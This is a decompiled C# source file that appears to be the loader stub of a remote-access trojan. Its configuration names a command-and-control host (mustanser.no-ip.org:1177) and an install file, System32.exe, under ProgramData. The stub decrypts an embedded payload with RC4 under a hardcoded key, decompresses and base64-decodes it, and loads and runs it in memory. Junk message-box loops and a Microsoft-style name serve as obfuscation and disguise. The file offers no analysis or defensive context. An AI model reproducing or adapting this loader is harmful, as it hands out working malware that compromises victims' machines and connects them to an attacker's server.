using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using MicrosoftCopy.Properties;

internal static class Class1
{
	private class Class2
	{
		public Class2(Assembly assembly_0, string[] string_0)
		{
			object object_ = assembly_0.CreateInstance(assembly_0.EntryPoint!.Name);
			new Class3(object_, string_0, assembly_0);
		}
	}

	private class Class3
	{
		public Class3(object object_0, string[] string_0, Assembly assembly_0)
		{
			assembly_0.EntryPoint!.Invoke(object_0, new object[1] { string_0 });
		}
	}

	public static bool bool_0 = Convert.ToBoolean("True");

	public static bool bool_1 = Convert.ToBoolean("True");

	public static bool bool_2 = Convert.ToBoolean("True");

	public static bool bool_3 = Convert.ToBoolean("True");

	public static string string_0 = "";

	public static string string_1 = "";

	public static bool bool_4 = Convert.ToBoolean("True");

	public static bool hyjtGuUuK = Convert.ToBoolean("True");

	public static bool bool_5 = Convert.ToBoolean("True");

	public static bool bool_6 = Convert.ToBoolean("True");

	public static bool bool_7 = Convert.ToBoolean("True");

	public static bool bool_8 = Convert.ToBoolean("True");

	public static bool bool_9 = Convert.ToBoolean("True");

	public static string string_2 = "ProgramData";

	public static string string_3 = "System32.exe";

	public static string string_4 = "mustanser.no-ip.org;1177,";

	public static string SedmUyBww = "";

	public static string string_5 = "e762428b721a1de0e50cb93c91ca629c";

	public static bool bool_10 = Convert.ToBoolean("True");

	public static string string_6 = "%vn%";

	public static string string_7 = "0.5.5";

	public static string string_8 = "";

	public static string string_9 = "0";

	public static string string_10 = "^";

	public static string string_11 = "";

	private static void Main()
	{
		object obj = string_11;
		string_11 = string.Concat(obj, bool_0.ToString(), string_10, bool_1, string_10, bool_2, string_10, bool_3, string_10);
		string text = string_11;
		string_11 = text + string_0 + string_10 + string_1 + string_10;
		object obj2 = string_11;
		string_11 = string.Concat(obj2, bool_4, string_10, hyjtGuUuK, string_10, bool_5, string_10);
		object obj3 = string_11;
		string_11 = string.Concat(obj3, bool_6, string_10, bool_7, string_10, bool_8, string_10);
		string_11 = string_11 + bool_9 + string_10;
		string text2 = string_11;
		string_11 = text2 + string_2 + string_10 + string_3 + string_10 + string_4 + string_10 + SedmUyBww + string_10 + string_5 + string_10;
		object obj4 = string_11;
		string_11 = string.Concat(obj4, bool_10, string_10, string_6, string_10, string_7, string_10, string_8, string_10, string_9);
		string[] array = new string[1] { string_11 };
		byte[] i = Resources.i3;
		i = smethod_1(i, "syria");
		i = smethod_4(i);
		string s = smethod_0(i);
		Assembly assembly_ = Assembly.Load(Convert.FromBase64String(s));
		new Class2(assembly_, array);
	}

	public static string smethod_0(byte[] byte_0)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		for (int i = 0; i < -1; i++)
		{
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
		}
		return Encoding.UTF8.GetString(byte_0);
	}

	public static byte[] smethod_1(byte[] byte_0, string string_12)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(string_12);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes[i % bytes.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < byte_0.GetLength(0); j++)
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			byte b = array[i];
			array[i] = array[num];
			array[num] = b;
			int num2 = (array[i] + array[num]) % 256;
			byte_0[j] ^= array[num2];
		}
		return byte_0;
	}

	public static void smethod_2(Stream stream_0, Stream stream_1)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		for (int i = 0; i < -1; i++)
		{
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
		}
		byte[] array = new byte[4096];
		for (int j = 0; j < -1; j++)
		{
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
			MessageBox.Show("");
		}
		int num = 0;
		try
		{
			while ((num = stream_0.Read(array, 0, array.Length)) != 0)
			{
				stream_1.Write(array, 0, num);
			}
		}
		catch
		{
		}
	}

	public static byte[] smethod_3(byte[] byte_0)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		using MemoryStream stream_ = new MemoryStream(byte_0);
		using MemoryStream memoryStream = new MemoryStream();
		using (GZipStream stream_2 = new GZipStream(memoryStream, CompressionMode.Compress))
		{
			smethod_2(stream_, stream_2);
			for (int i = 0; i < -1; i++)
			{
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
				MessageBox.Show("");
			}
		}
		return memoryStream.ToArray();
	}

	public static byte[] smethod_4(byte[] byte_0)
	{
		MemoryStream stream = new MemoryStream(byte_0);
		using MemoryStream memoryStream = new MemoryStream();
		using (GZipStream stream_ = new GZipStream(stream, CompressionMode.Decompress))
		{
			smethod_2(stream_, memoryStream);
		}
		return memoryStream.ToArray();
	}
}
